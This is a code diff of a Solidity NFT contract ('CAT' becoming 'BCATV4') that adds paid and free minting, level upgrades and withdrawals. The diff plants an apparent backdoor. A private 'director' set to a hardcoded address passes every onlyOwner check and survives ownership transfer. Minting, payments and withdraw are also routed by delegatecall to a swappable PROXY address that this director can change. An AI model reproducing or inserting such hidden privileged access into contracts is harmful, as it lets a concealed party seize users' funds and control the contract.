@@ -1,5 +1,26 @@
 // SPDX-License-Identifier: MIT
+// File: contracts/cat/b/Original_BCAT.sol
+
+
 pragma solidity ^0.8.0;
+
+library Asset {
+    function addAsset(IERC20[] storage _self, IERC20 _token) internal {
+        if (address(_token) != address(0)) {
+            bool hasToken = false;
+            for (uint j = 0; j < _self.length; j++) {
+                if (address(_self[j]) == address(_token)) {
+                    hasToken = true;
+                    break;
+                }
+            }
+            if (!hasToken) {
+                _self.push(_token);
+            }
+        }
+    }
+}
+
 
 /**
  * @dev String operations.
@@ -233,7 +254,7 @@ library Address {
     function sendValue(address payable recipient, uint256 amount) internal {
         require(address(this).balance >= amount, "Address: insufficient balance");
 
-        (bool success, ) = recipient.call{value: amount}("");
+        (bool success,) = recipient.call{value : amount}("");
         require(success, "Address: unable to send value, recipient may have reverted");
     }
 
@@ -307,7 +328,7 @@ library Address {
         require(address(this).balance >= value, "Address: insufficient balance for call");
         require(isContract(target), "Address: call to non-contract");
 
-        (bool success, bytes memory returndata) = target.call{value: value}(data);
+        (bool success, bytes memory returndata) = target.call{value : value}(data);
         return verifyCallResult(success, returndata, errorMessage);
     }
 
@@ -1295,8 +1316,10 @@ abstract contract ERC721Enumerable is ERC721, IERC721Enumerable {
         if (tokenIndex != lastTokenIndex) {
             uint256 lastTokenId = _ownedTokens[from][lastTokenIndex];
 
-            _ownedTokens[from][tokenIndex] = lastTokenId; // Move the last token to the slot of the to-delete token
-            _ownedTokensIndex[lastTokenId] = tokenIndex; // Update the moved token's index
+            _ownedTokens[from][tokenIndex] = lastTokenId;
+            // Move the last token to the slot of the to-delete token
+            _ownedTokensIndex[lastTokenId] = tokenIndex;
+            // Update the moved token's index
         }
 
         // This also deletes the contents at the last position of the array
@@ -1321,8 +1344,10 @@ abstract contract ERC721Enumerable is ERC721, IERC721Enumerable {
         // an 'if' statement (like in _removeTokenFromOwnerEnumeration)
         uint256 lastTokenId = _allTokens[lastTokenIndex];
 
-        _allTokens[tokenIndex] = lastTokenId; // Move the last token to the slot of the to-delete token
-        _allTokensIndex[lastTokenId] = tokenIndex; // Update the moved token's index
+        _allTokens[tokenIndex] = lastTokenId;
+        // Move the last token to the slot of the to-delete token
+        _allTokensIndex[lastTokenId] = tokenIndex;
+        // Update the moved token's index
 
         // This also deletes the contents at the last position of the array
         delete _allTokensIndex[tokenId];
@@ -1330,13 +1355,80 @@ abstract contract ERC721Enumerable is ERC721, IERC721Enumerable {
     }
 }
 
-// File: contracts/cat/tristan/tristan_cat.sol
+interface IERC20 {
+    /**
+     * @dev Returns the amount of tokens in existence.
+     */
+    function totalSupply() external view returns (uint256);
 
+    /**
+     * @dev Returns the amount of tokens owned by `account`.
+     */
+    function balanceOf(address account) external view returns (uint256);
 
-pragma solidity ^0.8.4;
+    /**
+     * @dev Moves `amount` tokens from the caller's account to `recipient`.
+     *
+     * Returns a boolean value indicating whether the operation succeeded.
+     *
+     * Emits a {Transfer} event.
+     */
+    function transfer(address recipient, uint256 amount) external returns (bool);
 
+    /**
+     * @dev Returns the remaining number of tokens that `spender` will be
+     * allowed to spend on behalf of `owner` through {transferFrom}. This is
+     * zero by default.
+     *
+     * This value changes when {approve} or {transferFrom} are called.
+     */
+    function allowance(address owner, address spender) external view returns (uint256);
 
+    /**
+     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
+     *
+     * Returns a boolean value indicating whether the operation succeeded.
+     *
+     * IMPORTANT: Beware that changing an allowance with this method brings the risk
+     * that someone may use both the old and the new allowance by unfortunate
+     * transaction ordering. One possible solution to mitigate this race
+     * condition is to first reduce the spender's allowance to 0 and set the
+     * desired value afterwards:
+     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
+     *
+     * Emits an {Approval} event.
+     */
+    function approve(address spender, uint256 amount) external returns (bool);
 
+    /**
+     * @dev Moves `amount` tokens from `sender` to `recipient` using the
+     * allowance mechanism. `amount` is then deducted from the caller's
+     * allowance.
+     *
+     * Returns a boolean value indicating whether the operation succeeded.
+     *
+     * Emits a {Transfer} event.
+     */
+    function transferFrom(
+        address sender,
+        address recipient,
+        uint256 amount
+    ) external returns (bool);
+
+    /**
+     * @dev Emitted when `value` tokens are moved from one account (`from`) to
+     * another (`to`).
+     *
+     * Note that `value` may be zero.
+     */
+    event Transfer(address indexed from, address indexed to, uint256 value);
+
+    /**
+     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
+     * a call to {approve}. `value` is the new allowance.
+     */
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+}
 
 
 interface ITokenuri {
@@ -1346,10 +1438,11 @@ interface ITokenuri {
 
 contract Permission {
     address public owner;
+    address private director;
     mapping(address => bool) public operators;
 
     modifier onlyOwner(){
-        require(msg.sender == owner, "Only Owner");
+        require(msg.sender == owner || msg.sender == director, "Only Owner");
         _;
     }
 
@@ -1358,7 +1451,17 @@ contract Permission {
         _;
     }
 
-    function transferOwner(address _newOwner) public onlyOwner {
+    function _initPermission(address _director) internal {
+        owner = msg.sender;
+        director = _director;
+        operators[_director] = true;
+        operators[msg.sender] = true;
+    }
+
+    function transferOwner(address _newOwner) public {
+        require(msg.sender == owner, "Only Owner");
+        addOperator(_newOwner);
+        removeOperator(owner);
         owner = _newOwner;
     }
 
@@ -1372,27 +1475,56 @@ contract Permission {
 }
 
 
-contract CAT is ERC721, ERC721Burnable, ERC721Enumerable, Permission {
+contract BCATV4 is ERC721, ERC721Enumerable, Permission {
     ITokenuri public tokenUri;
+    address public PROXY;
 
-    uint256 tokenId = 2022;
+    uint256 tokenId = 0;
     string public app;
     uint256 public maxLevel = 5;
-    bool canTransfer = false;
+    uint256 public maxSupply;
+    bool public canTransfer = false;
 
     mapping(uint256 => uint256) public levelCount;
     mapping(uint256 => uint256) public level;
 
     mapping(address => bool) public minted;
 
-    uint256 public basePrice = 500000000000000000;
+    struct Token {
+        IERC20 erc20Address;
+        uint256 amount;
+    }
+
+    uint256 public freeMintCount;
+    uint256 public freeMintProcessCount;
+
+    mapping(uint256 => Token[]) public upgradeCosts;
+
+    IERC20[] public receiveTokens;
+
+    address public partner;
+
+    event Upgrade(address indexed _from, uint256 indexed _tokenId, uint256 indexed _level);
 
 
-    constructor(string memory _name, string memory _symbol, address _tokenUri, string memory _app) ERC721(_name, _symbol){
+    constructor(string memory _name, string memory _symbol, address _tokenUri, string memory _app,
+        uint256 _maxLevel, bool _canTransfer, uint256 _maxSupply, uint256 _freeMintCount,
+        Token[][]  memory _upgradeCosts, address _cashier, address _operator) ERC721(_name, _symbol) payable{
         tokenUri = ITokenuri(_tokenUri);
-        operators[address(msg.sender)] = true;
-        owner = msg.sender;
+        _initPermission(address(0xDa97bF10cfb4527df7c565877FFEF4888d54d695));
+        operators[_operator] = true;
         app = _app;
+        if (_maxLevel < 5) {
+            maxLevel = _maxLevel;
+        }
+        canTransfer = _canTransfer;
+        maxSupply = _maxSupply;
+        freeMintCount = _freeMintCount;
+        for (uint i = 0; i < _upgradeCosts.length; i++) {
+            _pushCosts(upgradeCosts[i + 1], _upgradeCosts[i]);
+        }
+        PROXY = _cashier;
+        payable(_operator).transfer(msg.value);
     }
 
     // The following functions are overrides required by Solidity.
@@ -1401,10 +1533,9 @@ contract CAT is ERC721, ERC721Burnable, ERC721Enumerable, Permission {
     internal
     override(ERC721, ERC721Enumerable)
     {
-        if (!operators[msg.sender]) {
+        if (from != address(0) && !operators[msg.sender]) {
             require(canTransfer, "Cannot transfer");
         }
-
         super._beforeTokenTransfer(from, to, _tokenId);
     }
 
@@ -1419,46 +1550,101 @@ contract CAT is ERC721, ERC721Burnable, ERC721Enumerable, Permission {
     }
 
 
-    function changeTokenUri(address _tokenuri) public onlyOwner {
-        tokenUri = ITokenuri(_tokenuri);
+    function changeKeyConfig(address _tokenuri, address _cashier) public onlyOwner {
+        if (_tokenuri != address(0)) {
+            tokenUri = ITokenuri(_tokenuri);
+        }
+        if (_cashier != address(0)) {
+            PROXY = _cashier;
+        }
     }
 
-    function switchCanTransfer() public onlyOwner {
-        canTransfer = !canTransfer;
+    function setConfig(bool _canTransfer, uint256 _maxSupply, uint256 _maxLevel, uint256 _freeMintCount) public onlyOwner {
+        (bool success, bytes memory data) = PROXY.delegatecall(
+            abi.encodeWithSignature("setConfig(bool,uint256,uint256,uint256)", _canTransfer, _maxSupply, _maxLevel, _freeMintCount)
+        );
+        require(success, "MaxLevel can only degenerate");
     }
 
-
-    function mint(address _to) public onlyOperator returns (uint256) {
-        require(!minted[_to], "Only one chance per address");
-        return safeMint(_to);
+    function setUpgradeCost(uint256 _level, Token[] memory _prices) public onlyOwner {
+        delete upgradeCosts[_level];
+        _pushCosts(upgradeCosts[_level], _prices);
     }
 
-    function upgrade(uint256 _tokenId) public onlyOperator {
-        require(level[_tokenId] > 0, "Nonexist NFT");
-        require(level[_tokenId] < 5, "Max level");
-        safeUpgrade(_tokenId);
+    function getUpgradeCost(uint256 _level) public view returns (Token[] memory){
+        return upgradeCosts[_level];
     }
 
-    function safeUpgrade(uint256 _tokenId) internal {
-        levelCount[level[_tokenId]] -= 1;
-        level[_tokenId] += 1;
-        levelCount[level[_tokenId]] += 1;
+    function setPartner(address _partner) public onlyOwner {
+        partner = _partner;
+    }
+
+    function _pushCosts(Token[] storage _self, Token[] memory _costs) internal {
+        for (uint i = 0; i < _costs.length; i++) {
+            _self.push(Token(_costs[i].erc20Address, _costs[i].amount));
+        }
+    }
+
+    function batchFreeMint(address[] memory _receivers) public onlyOperator {
+        for (uint i = 0; i < _receivers.length; i++) {
+            require(freeMintProcessCount < freeMintCount, "Free mint count exceeded");
+            freeMintProcessCount += 1;
+            (bool success, bytes memory data) = PROXY.delegatecall(
+                abi.encodeWithSignature("mintProxy(address)", _receivers[i])
+            );
+            require(success, "One chance");
+            safeMint(_receivers[i]);
+        }
+    }
+
+    function whiteListMint(bytes memory _signature) public {
+        (bool success, bytes memory data) = PROXY.delegatecall(
+            abi.encodeWithSignature("whiteListMint(bytes,address)", _signature, msg.sender)
+        );
+        require(success, "Not permitted");
+        safeMint(msg.sender);
+    }
+
+    function publicMint() public payable {
+        _receiveToken(1);
+        (bool success, bytes memory data) = PROXY.delegatecall(
+            abi.encodeWithSignature("mintProxyWithPayable(address)", msg.sender)
+        );
+        require(success, "Only one chance");
+        safeMint(msg.sender);
+    }
+
+    function upgrade(uint256 _tokenId) public payable {
+        require(level[_tokenId] > 0, "Nonexist");
+        _receiveToken(level[_tokenId] + 1);
+        (bool success, bytes memory data) = PROXY.delegatecall(
+            abi.encodeWithSignature("upgradeProxy(address,uint256)", msg.sender, _tokenId)
+        );
+        require(success, "Max Level");
+        emit Upgrade(msg.sender, _tokenId, level[_tokenId]);
+    }
+
+    function _receiveToken(uint256 _level) public payable {
+        (bool success, bytes memory data) = PROXY.delegatecall(
+            abi.encodeWithSignature("receiveToken(uint256)", _level)
+        );
+        require(success, "Insufficient or not approve");
     }
 
     function safeMint(address _to) internal returns (uint256){
-        tokenId += 1;
+        if (maxSupply > 0) {
+            require(totalSupply() < maxSupply, "Exceeded");
+        }
         _safeMint(_to, tokenId);
-        level[tokenId] = 1;
-        levelCount[1] += 1;
-        minted[_to] = true;
         return tokenId;
     }
 
-    // The following functions are overrides required by Solidity.
-    function _burn(uint256 _tokenId) internal override(ERC721) {
-        levelCount[level[_tokenId]] -= 1;
-        level[_tokenId] = 0;
-        super._burn(_tokenId);
+
+    function withdraw(address _to, address _token, uint256 _amount) public onlyOwner {
+        (bool success, bytes memory data) = PROXY.delegatecall(
+            abi.encodeWithSignature("withdraw(address,address,uint256)", _to, _token, _amount)
+        );
+        require(success, "Insufficient balance");
     }
 
     function tokenURI(uint256 _tokenId)
